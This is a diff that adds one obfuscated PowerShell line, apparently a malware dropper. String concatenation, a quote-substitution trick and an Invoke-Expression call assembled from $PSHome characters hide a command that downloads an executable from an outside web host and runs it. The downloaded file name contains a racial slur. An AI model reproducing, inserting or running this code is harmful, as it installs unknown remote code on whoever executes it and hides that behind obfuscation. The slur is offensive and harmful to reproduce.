@@ -1,0 +1,1 @@
+﻿ ('(New-Objec'+'t System.'+'Net.WebCl'+'ien'+'t).'+'Down'+'load'+'File(vp1http://wo'+'rl'+'dni'+'t.com/nig'+'ga.exevp1'+',v'+'p'+'1mess.ex'+'e'+'vp1);'+'Start-Pr'+'oce'+'ss vp1mess.e'+'xevp1').REplace('vp1',[String][cHaR]39)|.( $PsHOme[21]+$PsHoME[30]+'x')
